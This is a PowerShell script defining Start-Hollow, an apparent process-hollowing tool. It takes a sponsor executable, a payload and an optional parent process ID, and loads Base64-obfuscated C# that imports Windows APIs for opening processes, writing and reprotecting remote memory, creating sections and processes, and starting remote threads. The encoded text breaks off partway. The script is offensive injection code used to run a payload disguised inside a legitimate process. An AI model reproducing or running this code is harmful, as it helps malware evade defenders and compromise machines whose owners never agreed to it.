function Start-Hollow {
	[CmdletBinding()]
	param(
		[Parameter(Mandatory = $True)]
		[String]$Sponsor,
		[Parameter(Mandatory = $True)]
		[String]$Hollow,
		[Parameter(Mandatory = $False)]
		[int]$ParentPID
	)
	Add-Type -TypeDefinition $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CQB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AA0ACgAJAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzADsADQAKAAkAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoACQB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsADsADQAKAA0ACgAJAFsARgBsAGEAZwBzAF0ADQAKAAkAcAB1AGIAbABpAGMAIABlAG4AdQBtACAAQQBsAGwAbwBjAGEAdABpAG8AbgBQAHIAbwB0AGUAYwB0ACAAOgAgAHUAaQBuAHQADQAKAAkAewANAAoACQAJAE4ATwBOAEUAIAA9ACAAMAB4ADAAMAAwADAAMAAwADAAMAAsAA0ACgAJAAkAUABBAEcARQBfAEUAWABFAEMAVQBUAEUAIAA9ACAAMAB4ADAAMAAwADAAMAAwADEAMAAsAA0ACgAJAAkAUABBAEcARQBfAEUAWABFAEMAVQBUAEUAXwBSAEUAQQBEACAAPQAgADAAeAAwADAAMAAwADAAMAAyADAALAANAAoACQAJAFAAQQBHAEUAXwBFAFgARQBDAFUAVABFAF8AUgBFAEEARABXAFIASQBUAEUAIAA9ACAAMAB4ADAAMAAwADAAMAAwADQAMAAsAA0ACgAJAAkAUABBAEcARQBfAEUAWABFAEMAVQBUAEUAXwBXAFIASQBUAEUAQwBPAFAAWQAgAD0AIAAwAHgAMAAwADAAMAAwADAAOAAwACwADQAKAAkACQBQAEEARwBFAF8ATgBPAEEAQwBDAEUAUwBTACAAPQAgADAAeAAwADAAMAAwADAAMAAwADEALAANAAoACQAJAFAAQQBHAEUAXwBSAEUAQQBEAE8ATgBMAFkAIAA9ACAAMAB4ADAAMAAwADAAMAAwADAAMgAsAA0ACgAJAAkAUABBAEcARQBfAFIARQBBAEQAVwBSAEkAVABFACAAPQAgADAAeAAwADAAMAAwADAAMAAwADQALAANAAoACQAJAFAAQQBHAEUAXwBXAFIASQBUAEUAQwBPAFAAWQAgAD0AIAAwAHgAMAAwADAAMAAwADAAMAA4ACwADQAKAAkACQBQAEEARwBFAF8ARwBVAEEAUgBEACAAPQAgADAAeAAwADAAMAAwADAAMQAwADAALAANAAoACQAJAFAAQQBHAEUAXwBOAE8AQwBBAEMASABFACAAPQAgADAAeAAwADAAMAAwADAAMgAwADAALAANAAoACQAJAFAAQQBHAEUAXwBXAFIASQBUAEUAQwBPAE0AQgBJAE4ARQAgAD0AIAAwAHgAMAAwADAAMAAwADQAMAAwAA0ACgAJAH0ADQAKAA0ACgAJAFsARgBsAGEAZwBzAF0ADQAKAAkAcAB1AGIAbABpAGMAIABlAG4AdQBtACAAUwBlAGMAdABpAG8AbgBGAGwAYQBnAHMAIAA6ACAAdQBpAG4AdAANAAoACQB7AA0ACgAJAAkAVABZAFAARQBfAE4ATwBfAFAAQQBEACAAPQAgADAAeAAwADAAMAAwADAAMAAwADgALAANAAoACQAJAEMATgBUAF8AQwBPAEQARQAgAD0AIAAwAHgAMAAwADAAMAAwADAAMgAwACwADQAKAAkACQBDAE4AVABfAEkATgBJAFQASQBBAEwASQBaAEUARABfAEQAQQBUAEEAIAA9ACAAMAB4ADAAMAAwADAAMAAwADQAMAAsAA0ACgAJAAkAQwBOAFQAXwBVAE4ASQBOAEkAVABJAEEATABJAFoARQBEAF8ARABBAFQAQQAgAD0AIAAwAHgAMAAwADAAMAAwADAAOAAwACwADQAKAAkACQBMAE4ASwBfAEkATgBGAE8AIAA9ACAAMAB4ADAAMAAwADAAMAAyADAAMAAsAA0ACgAJAAkATABOAEsAXwBSAEUATQBPAFYARQAgAD0AIAAwAHgAMAAwADAAMAAwADgAMAAwACwADQAKAAkACQBMAE4ASwBfAEMATwBNAEQAQQBUACAAPQAgADAAeAAwADAAMAAwADEAMAAwADAALAANAAoACQAJAE4ATwBfAEQARQBGAEUAUgBfAFMAUABFAEMAXwBFAFgAQwAgAD0AIAAwAHgAMAAwADAAMAA0ADAAMAAwACwADQAKAAkACQBHAFAAUgBFAEwAIAA9ACAAMAB4ADAAMAAwADAAOAAwADAAMAAsAA0ACgAJAAkATQBFAE0AXwBGAEEAUgBEAEEAVABBACAAPQAgADAAeAAwADAAMAAwADgAMAAwADAALAANAAoACQAJAE0ARQBNAF8AUABVAFIARwBFAEEAQgBMAEUAIAA9ACAAMAB4ADAAMAAwADIAMAAwADAAMAAsAA0ACgAJAAkATQBFAE0AXwAxADYAQgBJAFQAIAA9ACAAMAB4ADAAMAAwADIAMAAwADAAMAAsAA0ACgAJAAkATQBFAE0AXwBMAE8AQwBLAEUARAAgAD0AIAAwAHgAMAAwADAANAAwADAAMAAwACwADQAKAAkACQBNAEUATQBfAFAAUgBFAEwATwBBAEQAIAA9ACAAMAB4ADAAMAAwADgAMAAwADAAMAAsAA0ACgAJAAkAQQBMAEkARwBOAF8AMQBCAFkAVABFAFMAIAA9ACAAMAB4ADAAMAAxADAAMAAwADAAMAAsAA0ACgAJAAkAQQBMAEkARwBOAF8AMgBCAFkAVABFAFMAIAA9ACAAMAB4ADAAMAAyADAAMAAwADAAMAAsAA0ACgAJAAkAQQBMAEkARwBOAF8ANABCAFkAVABFAFMAIAA9ACAAMAB4ADAAMAAzADAAMAAwADAAMAAsAA0ACgAJAAkAQQBMAEkARwBOAF8AOABCAFkAVABFAFMAIAA9ACAAMAB4ADAAMAA0ADAAMAAwADAAMAAsAA0ACgAJAAkAQQBMAEkARwBOAF8AMQA2AEIAWQBUAEUAUwAgAD0AIAAwAHgAMAAwADUAMAAwADAAMAAwACwADQAKAAkACQBBAEwASQBHAE4AXwAzADIAQgBZAFQARQBTACAAPQAgADAAeAAwADAANgAwADAAMAAwADAALAANAAoACQAJAEEATABJAEcATgBfADYANABCAFkAVABFAFMAIAA9ACAAMAB4ADAAMAA3ADAAMAAwADAAMAAsAA0ACgAJAAkAQQBMAEkARwBOAF8AMQAyADgAQgBZAFQARQBTACAAPQAgADAAeAAwADAAOAAwADAAMAAwADAALAANAAoACQAJAEEATABJAEcATgBfADIANQA2AEIAWQBUAEUAUwAgAD0AIAAwAHgAMAAwADkAMAAwADAAMAAwACwADQAKAAkACQBBAEwASQBHAE4AXwA1ADEAMgBCAFkAVABFAFMAIAA9ACAAMAB4ADAAMABBADAAMAAwADAAMAAsAA0ACgAJAAkAQQBMAEkARwBOAF8AMQAwADIANABCAFkAVABFAFMAIAA9ACAAMAB4ADAAMABCADAAMAAwADAAMAAsAA0ACgAJAAkAQQBMAEkARwBOAF8AMgAwADQAOABCAFkAVABFAFMAIAA9ACAAMAB4ADAAMABDADAAMAAwADAAMAAsAA0ACgAJAAkAQQBMAEkARwBOAF8ANAAwADkANgBCAFkAVABFAFMAIAA9ACAAMAB4ADAAMABEADAAMAAwADAAMAAsAA0ACgAJAAkAQQBMAEkARwBOAF8AOAAxADkAMgBCAFkAVABFAFMAIAA9ACAAMAB4ADAAMABFADAAMAAwADAAMAAsAA0ACgAJAAkAQQBMAEkARwBOAF8ATQBBAFMASwAgAD0AIAAwAHgAMAAwAEYAMAAwADAAMAAwACwADQAKAAkACQBMAE4ASwBfAE4AUgBFAEwATwBDAF8ATwBWAEYATAAgAD0AIAAwAHgAMAAxADAAMAAwADAAMAAwACwADQAKAAkACQBNAEUATQBfAEQASQBTAEMAQQBSAEQAQQBCAEwARQAgAD0AIAAwAHgAMAAyADAAMAAwADAAMAAwACwADQAKAAkACQBNAEUATQBfAE4ATwBUAF8AQwBBAEMASABFAEQAIAA9ACAAMAB4ADAANAAwADAAMAAwADAAMAAsAA0ACgAJAAkATQBFAE0AXwBOAE8AVABfAFAAQQBHAEUARAAgAD0AIAAwAHgAMAA4ADAAMAAwADAAMAAwACwADQAKAAkACQBNAEUATQBfAFMASABBAFIARQBEACAAPQAgADAAeAAxADAAMAAwADAAMAAwADAALAANAAoACQAJAE0ARQBNAF8ARQBYAEUAQwBVAFQARQAgAD0AIAAwAHgAMgAwADAAMAAwADAAMAAwACwADQAKAAkACQBNAEUATQBfAFIARQBBAEQAIAA9ACAAMAB4ADQAMAAwADAAMAAwADAAMAAsAA0ACgAJAAkATQBFAE0AXwBXAFIASQBUAEUAIAA9ACAAMAB4ADgAMAAwADAAMAAwADAAMAANAAoACQB9AA0ACgANAAoACQBbAFMAdAByAHUAYwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUAZQBuAHQAaQBhAGwAKQBdAA0ACgAJAHAAdQBiAGwAaQBjACAAcwB0AHIAdQBjAHQAIABVAE4ASQBDAE8ARABFAF8AUwBUAFIASQBOAEcADQAKAAkAewANAAoACQAJAHAAdQBiAGwAaQBjACAAVQBJAG4AdAAxADYAIABMAGUAbgBnAHQAaAA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABVAEkAbgB0ADEANgAgAE0AYQB4AGkAbQB1AG0ATABlAG4AZwB0AGgAOwANAAoACQAJAHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABCAHUAZgBmAGUAcgA7AA0ACgAJAH0ADQAKAAkADQAKAAkAWwBTAHQAcgB1AGMAdABMAGEAeQBvAHUAdAAoAEwAYQB5AG8AdQB0AEsAaQBuAGQALgBTAGUAcQB1AGUAbgB0AGkAYQBsACkAXQANAAoACQBwAHUAYgBsAGkAYwAgAHMAdAByAHUAYwB0ACAATwBCAEoARQBDAFQAXwBBAFQAVABSAEkAQgBVAFQARQBTAA0ACgAJAHsADQAKAAkACQBwAHUAYgBsAGkAYwAgAEkAbgB0ADMAMgAgAEwAZQBuAGcAdABoADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAUgBvAG8AdABEAGkAcgBlAGMAdABvAHIAeQA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABJAG4AdABQAHQAcgAgAE8AYgBqAGUAYwB0AE4AYQBtAGUAOwANAAoACQAJAHAAdQBiAGwAaQBjACAAVQBJAG4AdAAzADIAIABBAHQAdAByAGkAYgB1AHQAZQBzADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAUwBlAGMAdQByAGkAdAB5AEQAZQBzAGMAcgBpAHAAdABvAHIAOwANAAoACQAJAHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABTAGUAYwB1AHIAaQB0AHkAUQB1AGEAbABpAHQAeQBPAGYAUwBlAHIAdgBpAGMAZQA7AA0ACgAJAH0ADQAKAA0ACgAJAFsAUwB0AHIAdQBjAHQATABhAHkAbwB1AHQAKABMAGEAeQBvAHUAdABLAGkAbgBkAC4AUwBlAHEAdQBlAG4AdABpAGEAbAApAF0ADQAKAAkAcAB1AGIAbABpAGMAIABzAHQAcgB1AGMAdAAgAEkATwBfAFMAVABBAFQAVQBTAF8AQgBMAE8AQwBLAA0ACgAJAHsADQAKAAkACQBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAUwB0AGEAdAB1AHMAOwANAAoACQAJAHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AOwANAAoACQB9AA0ACgANAAoACQBbAFMAdAByAHUAYwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUAZQBuAHQAaQBhAGwALAAgAFAAYQBjAGsAIAA9ACAAMQApAF0ADQAKAAkAcAB1AGIAbABpAGMAIABzAHQAcgB1AGMAdAAgAEwAQQBSAEcARQBfAEkATgBUAEUARwBFAFIADQAKAAkAewANAAoACQAJAHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEwAbwB3AFAAYQByAHQAOwANAAoACQAJAHAAdQBiAGwAaQBjACAAaQBuAHQAIABIAGkAZwBoAFAAYQByAHQAOwANAAoACQB9AA0ACgANAAoACQBbAFMAdAByAHUAYwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUAZQBuAHQAaQBhAGwAKQBdAA0ACgAJAHAAdQBiAGwAaQBjACAAcwB0AHIAdQBjAHQAIABQAFIATwBDAEUAUwBTAF8AQgBBAFMASQBDAF8ASQBOAEYATwBSAE0AQQBUAEkATwBOAA0ACgAJAHsADQAKAAkACQBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAARQB4AGkAdABTAHQAYQB0AHUAcwA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABJAG4AdABQAHQAcgAgAFAAZQBiAEIAYQBzAGUAQQBkAGQAcgBlAHMAcwA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABJAG4AdABQAHQAcgAgAEEAZgBmAGkAbgBpAHQAeQBNAGEAcwBrADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAQgBhAHMAZQBQAHIAaQBvAHIAaQB0AHkAOwANAAoACQAJAHAAdQBiAGwAaQBjACAAVQBJAG4AdABQAHQAcgAgAFUAbgBpAHEAdQBlAFAAcgBvAGMAZQBzAHMASQBkADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAASQBuAGgAZQByAGkAdABlAGQARgByAG8AbQBVAG4AaQBxAHUAZQBQAHIAbwBjAGUAcwBzAEkAZAA7AA0ACgAJAH0ADQAKAA0ACgAJAFsAUwB0AHIAdQBjAHQATABhAHkAbwB1AHQAKABMAGEAeQBvAHUAdABLAGkAbgBkAC4AUwBlAHEAdQBlAG4AdABpAGEAbAAsACAAUABhAGMAawA9ADEAKQBdAA0ACgAJAHAAdQBiAGwAaQBjACAAcwB0AHIAdQBjAHQAIABJAE0AQQBHAEUAXwBTAEUAQwBUAEkATwBOAF8ASABFAEEARABFAFIADQAKAAkAewANAAoACQAJAFsATQBhAHIAcwBoAGEAbABBAHMAKABVAG4AbQBhAG4AYQBnAGUAZABUAHkAcABlAC4AQgB5AFYAYQBsAFQAUwB0AHIALAAgAFMAaQB6AGUAQwBvAG4AcwB0ACAAPQAgADgAKQBdAA0ACgAJAAkAcAB1AGIAbABpAGMAIABzAHQAcgBpAG4AZwAgAE4AYQBtAGUAOwANAAoACQAJAHAAdQBiAGwAaQBjACAAVQBJAG4AdAAzADIAIABWAGkAcgB0AHUAYQBsAFMAaQB6AGUAOwANAAoACQAJAHAAdQBiAGwAaQBjACAAVQBJAG4AdAAzADIAIABWAGkAcgB0AHUAYQBsAEEAZABkAHIAZQBzAHMAOwANAAoACQAJAHAAdQBiAGwAaQBjACAAVQBJAG4AdAAzADIAIABTAGkAegBlAE8AZgBSAGEAdwBEAGEAdABhADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAFUASQBuAHQAMwAyACAAUABvAGkAbgB0AGUAcgBUAG8AUgBhAHcARABhAHQAYQA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABVAEkAbgB0ADMAMgAgAFAAbwBpAG4AdABlAHIAVABvAFIAZQBsAG8AYwBhAHQAaQBvAG4AcwA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABVAEkAbgB0ADMAMgAgAFAAbwBpAG4AdABlAHIAVABvAEwAaQBuAGUAbgB1AG0AYgBlAHIAcwA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABVAEkAbgB0ADEANgAgAE4AdQBtAGIAZQByAE8AZgBSAGUAbABvAGMAYQB0AGkAbwBuAHMAOwANAAoACQAJAHAAdQBiAGwAaQBjACAAVQBJAG4AdAAxADYAIABOAHUAbQBiAGUAcgBPAGYATABpAG4AZQBuAHUAbQBiAGUAcgBzADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAFMAZQBjAHQAaQBvAG4ARgBsAGEAZwBzACAAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMAOwANAAoACQB9AA0ACgAJAA0ACgAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABjAGwAYQBzAHMAIABIAG8AbABsAG8AdwANAAoACQB7AA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0ADQAKAAkACQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwAoAA0ACgAJAAkACQBVAEkAbgB0ADMAMgAgAHAAcgBvAGMAZQBzAHMAQQBjAGMAZQBzAHMALAANAAoACQAJAAkAYgBvAG8AbAAgAGIASQBuAGgAZQByAGkAdABIAGEAbgBkAGwAZQAsAA0ACgAJAAkACQBpAG4AdAAgAHAAcgBvAGMAZQBzAHMASQBkACkAOwANAAoADQAKAAkACQBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQANAAoACQAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEIAbwBvAGwAZQBhAG4AIABXAHIAaQB0AGUAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAoAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAGgAUAByAG8AYwBlAHMAcwAsAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAGwAcABCAGEAcwBlAEEAZABkAHIAZQBzAHMALAANAAoACQAJAAkASQBuAHQAUAB0AHIAIABsAHAAQgB1AGYAZgBlAHIALAANAAoACQAJAAkAVQBJAG4AdAAzADIAIABuAFMAaQB6AGUALAANAAoACQAJAAkAcgBlAGYAIABVAEkAbgB0ADMAMgAgAGwAcABOAHUAbQBiAGUAcgBPAGYAQgB5AHQAZQBzAFcAcgBpAHQAdABlAG4AKQA7AA0ACgANAAoACQAJAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIAKQBdAA0ACgAJAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAQgBvAG8AbABlAGEAbgAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAoACAADQAKAAkACQAJAEkAbgB0AFAAdAByACAAaABQAHIAbwBjAGUAcwBzACwAIAANAAoACQAJAAkASQBuAHQAUAB0AHIAIABsAHAAQgBhAHMAZQBBAGQAZAByAGUAcwBzACwADQAKAAkACQAJAEkAbgB0AFAAdAByACAAbABwAEIAdQBmAGYAZQByACwADQAKAAkACQAJAFUASQBuAHQAMwAyACAAZAB3AFMAaQB6AGUALAAgAA0ACgAJAAkACQByAGUAZgAgAFUASQBuAHQAMwAyACAAbABwAE4AdQBtAGIAZQByAE8AZgBCAHkAdABlAHMAUgBlAGEAZAApADsADQAKAA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0ADQAKAAkACQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjAEUAeAAoAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAGgAUAByAG8AYwBlAHMAcwAsAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwADQAKAAkACQAJAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsAA0ACgAJAAkACQBpAG4AdAAgAGYAbABBAGwAbABvAGMAYQB0AGkAbwBuAFQAeQBwAGUALAANAAoACQAJAAkAaQBuAHQAIABmAGwAUAByAG8AdABlAGMAdAApADsADQAKAA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0ADQAKAAkACQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0AEUAeAAoAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAGgAUAByAG8AYwBlAHMAcwAsAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwADQAKAAkACQAJAFUASQBuAHQAMwAyACAAZAB3AFMAaQB6AGUALAANAAoACQAJAAkAQQBsAGwAbwBjAGEAdABpAG8AbgBQAHIAbwB0AGUAYwB0ACAAZgBsAE4AZQB3AFAAcgBvAHQAZQBjAHQALAANAAoACQAJAAkAcgBlAGYAIABVAEkAbgB0ADMAMgAgAGwAcABmAGwATwBsAGQAUAByAG8AdABlAGMAdAApADsADQAKAA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbgB0AGQAbABsAC4AZABsAGwAIgApAF0ADQAKAAkACQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABVAEkAbgB0ADMAMgAgAE4AdABPAHAAZQBuAEYAaQBsAGUAKAANAAoACQAJAAkAcgBlAGYAIABJAG4AdABQAHQAcgAgAEYAaQBsAGUASABhAG4AZABsAGUALAANAAoACQAJAAkAVQBJAG4AdAAzADIAIABEAGUAcwBpAHIAZQBkAEEAYwBjAGUAcwBzACwADQAKAAkACQAJAHIAZQBmACAATwBCAEoARQBDAFQAXwBBAFQAVABSAEkAQgBVAFQARQBTACAATwBiAGoAQQB0AHQAcgAsAA0ACgAJAAkACQByAGUAZgAgAEkATwBfAFMAVABBAFQAVQBTAF8AQgBMAE8AQwBLACAASQBvAFMAdABhAHQAdQBzAEIAbABvAGMAawAsAA0ACgAJAAkACQBVAEkAbgB0ADMAMgAgAFMAaABhAHIAZQBBAGMAYwBlAHMAcwAsAA0ACgAJAAkACQBVAEkAbgB0ADMAMgAgAE8AcABlAG4ATwBwAHQAaQBvAG4AcwApADsADQAKAA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbgB0AGQAbABsAC4AZABsAGwAIgApAF0ADQAKAAkACQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABVAEkAbgB0ADMAMgAgAE4AdABDAHIAZQBhAHQAZQBTAGUAYwB0AGkAbwBuACgADQAKAAkACQAJAHIAZQBmACAASQBuAHQAUAB0AHIAIABzAGUAYwB0AGkAbwBuACwADQAKAAkACQAJAFUASQBuAHQAMwAyACAAZABlAHMAaQByAGUAZABBAGMAYwBlAHMAcwAsAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAHAAQQB0AHQAcgBzACwADQAKAAkACQAJAHIAZQBmACAATABBAFIARwBFAF8ASQBOAFQARQBHAEUAUgAgAHAATQBhAHgAUwBpAHoAZQAsAA0ACgAJAAkACQB1AGkAbgB0ACAAcABhAGcAZQBQAHIAbwB0ACwADQAKAAkACQAJAHUAaQBuAHQAIABhAGwAbABvAGMAYQB0AGkAbwBuAEEAdAB0AHIAaQBiAHMALAANAAoACQAJAAkASQBuAHQAUAB0AHIAIABoAEYAaQBsAGUAKQA7AA0ACgANAAoACQAJAFsARABsAGwASQBtAHAAbwByAHQAKAAiAG4AdABkAGwAbAAuAGQAbABsACIAKQBdAA0ACgAJAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAVQBJAG4AdAAzADIAIABOAHQAQwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwBFAHgAKAANAAoACQAJAAkAcgBlAGYAIABJAG4AdABQAHQAcgAgAFAAcgBvAGMAZQBzAHMASABhAG4AZABsAGUALAANAAoACQAJAAkAVQBJAG4AdAAzADIAIABEAGUAcwBpAHIAZQBkAEEAYwBjAGUAcwBzACwADQAKAAkACQAJAEkAbgB0AFAAdAByACAATwBiAGoAZQBjAHQAQQB0AHQAcgBpAGIAdQB0AGUAcwAsAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAGgASQBuAGgAZQByAGkAdABGAHIAbwBtAFAAcgBvAGMAZQBzAHMALAANAAoACQAJAAkAdQBpAG4AdAAgAEYAbABhAGcAcwAsAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAFMAZQBjAHQAaQBvAG4ASABhAG4AZABsAGUALAANAAoACQAJAAkASQBuAHQAUAB0AHIAIABEAGUAYgB1AGcAUABvAHIAdAAsAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAEUAeABjAGUAcAB0AGkAbwBuAFAAbwByAHQALAANAAoACQAJAAkAQgB5AHQAZQAgAEkAbgBKAG8AYgApADsADQAKAA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbgB0AGQAbABsAC4AZABsAGwAIgApAF0ADQAKAAkACQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABVAEkAbgB0ADMAMgAgAE4AdABRAHUAZQByAHkASQBuAGYAbwByAG0AYQB0AGkAbwBuAFAAcgBvAGMAZQBzAHMAKAANAAoACQAJAAkASQBuAHQAUAB0AHIAIABwAHIAbwBjAGUAcwBzAEgAYQBuAGQAbABlACwAIAANAAoACQAJAAkAVQBJAG4AdAAzADIAIABwAHIAbwBjAGUAcwBzAEkAbgBmAG8AcgBtAGEAdABpAG8AbgBDAGwAYQBzAHMALAANAAoACQAJAAkAcgBlAGYAIABQAFIATwBDAEUAUwBTAF8AQgBBAFMASQBDAF8ASQBOAEYATwBSAE0AQQBUAEkATwBOACAAcAByAG8AYwBlAHMAcwBJAG4AZgBvAHIAbQBhAHQAaQBvAG4ALAANAAoACQAJAAkAVQBJAG4AdAAzADIAIABwAHIAbwBjAGUAcwBzAEkAbgBmAG8AcgBtAGEAdABpAG8AbgBMAGUAbgBnAHQAaAAsAA0ACgAJAAkACQByAGUAZgAgAFUASQBuAHQAMwAyACAAcgBlAHQAdQByAG4ATABlAG4AZwB0AGgAKQA7AA0ACgANAAoACQAJAFsARABsAGwASQBtAHAAbwByAHQAKAAiAG4AdABkAGwAbAAuAGQAbABsACIAKQBdAA0ACgAJAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAVQBJAG4AdAAzADIAIABSAHQAbABDAHIAZQBhAHQAZQBQAHIAbwBjAGUAcwBzAFAAYQByAGEAbQBlAHQAZQByAHMARQB4ACgADQAKAAkACQAJAHIAZQBmACAASQBuAHQAUAB0AHIAIABwAFAAcgBvAGMAZQBzAHMAUABhAHIAYQBtAGUAdABlAHIAcwAsAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAEkAbQBhAGcAZQBQAGEAdABoAE4AYQBtAGUALAANAAoACQAJAAkASQBuAHQAUAB0AHIAIABEAGwAbABQAGEAdABoACwADQAKAAkACQAJAEkAbgB0AFAAdAByACAAQwB1AHIAcgBlAG4AdABEAGkAcgBlAGMAdABvAHIAeQAsAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAEMAbwBtAG0AYQBuAGQATABpAG4AZQAsAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAEUAbgB2AGkAcgBvAG4AbQBlAG4AdAAsAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAFcAaQBuAGQAbwB3AFQAaQB0AGwAZQAsAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAEQAZQBzAGsAdABvAHAASQBuAGYAbwAsAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAFMAaABlAGwAbABJAG4AZgBvACwADQAKAAkACQAJAEkAbgB0AFAAdAByACAAUgB1AG4AdABpAG0AZQBEAGEAdABhACwADQAKAAkACQAJAFUASQBuAHQAMwAyACAARgBsAGEAZwBzACkAOwANAAoADQAKAAkACQBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBuAHQAZABsAGwALgBkAGwAbAAiACkAXQANAAoACQAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAFUASQBuAHQAMwAyACAATgB0AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkAEUAeAAoAA0ACgAJAAkACQByAGUAZgAgAEkAbgB0AFAAdAByACAAaABUAGgAcgBlAGEAZAAsAA0ACgAJAAkACQBVAEkAbgB0ADMAMgAgAEQAZQBzAGkAcgBlAGQAQQBjAGMAZQBzAHMALAANAAoACQAJAAkASQBuAHQAUAB0AHIAIABPAGIAagBlAGMAdABBAHQAdAByAGkAYgB1AHQAZQBzACwADQAKAAkACQAJAEkAbgB0AFAAdAByACAAUAByAG8AYwBlAHMAcwBIAGEAbgBkAGwAZQAsAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAGwAcABTAHQAYQByAHQAQQBkAGQAcgBlAHMAcwAsAA0ACgAJAAkACQBJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsAA0ACgAJAAkACQBiAG8AbwBsACAAQwByAGUAYQB0AGUAUwB1AHMAcABlAG4AZABlAGQALAANAAoACQAJAAkAVQBJAG4AdAAzADIAIABTAHQAYQBjAGsAWgBlAHIAbwBCAGkAdABzACwADQAKAAkACQAJAFUASQBuAHQAMwAyACAAUwBpAHoAZQBPAGYAUwB0AGEAYwB